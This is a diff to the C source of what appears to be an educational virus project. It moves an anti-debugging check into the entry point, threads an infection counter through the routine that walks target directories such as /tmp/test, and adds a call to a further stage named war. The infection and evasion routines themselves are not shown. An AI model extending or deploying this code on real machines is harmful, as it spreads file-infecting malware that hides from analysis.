@@ -22,7 +22,7 @@
 
 extern void end();
 
-void	famine(bootstrap_data_t *bootstrap_data);
+void	famine(bootstrap_data_t *bootstrap_data, uint16_t *counter);
 void	jmp_end(void);
 void	entrypoint(int argc, char **argv, char **envp);
 void	_start(void);
@@ -300,15 +300,8 @@ static void open_file(const char *file, bootstrap_data_t *bs_data, uint16_t *cou
 
 }
 
-void	famine(bootstrap_data_t *bs_data)
+void	famine(bootstrap_data_t *bs_data, uint16_t *counter)
 {
-#ifndef DEV_MODE
-	if (pestilence() != 0) {
-		return ;
-	}
-#endif
-
-	uint16_t counter = 0;
 
 	const char *paths[] = {
 		STR("/tmp/test"),
@@ -317,16 +310,9 @@ void	famine(bootstrap_data_t *bs_data)
 		NULL
 	};
 
-	char host_name[PATH_MAX];
-
-	if (self_name(host_name) != 0) {
-		return ;
-	}
-
 	for (int i = 0; paths[i]; ++i)
-		open_file(paths[i], bs_data, &counter);
+		open_file(paths[i], bs_data, counter);
 
-	self_fingerprint(host_name, counter);
 }
 
 void	entrypoint(int argc, char **argv, char **envp)
@@ -336,10 +322,15 @@ void	entrypoint(int argc, char **argv, char **envp)
 	bootstrap_data.argv = argv;
 	bootstrap_data.envp = envp;
 
-	//write(1, bootstrap_data.argv[0], ft_strlen(bootstrap_data.argv[0]));
-	//write(1, STR("\n"), 1);
-	//
-	//print_env(bootstrap_data.envp);
+	uint16_t counter = 0;
+
+#ifndef DEV_MODE
+	if (pestilence() != 0) {
+		return ;
+	}
+#endif
+
 	daemonize(envp);
-	famine(&bootstrap_data);
+	famine(&bootstrap_data, &counter);
+	war(counter);
 }
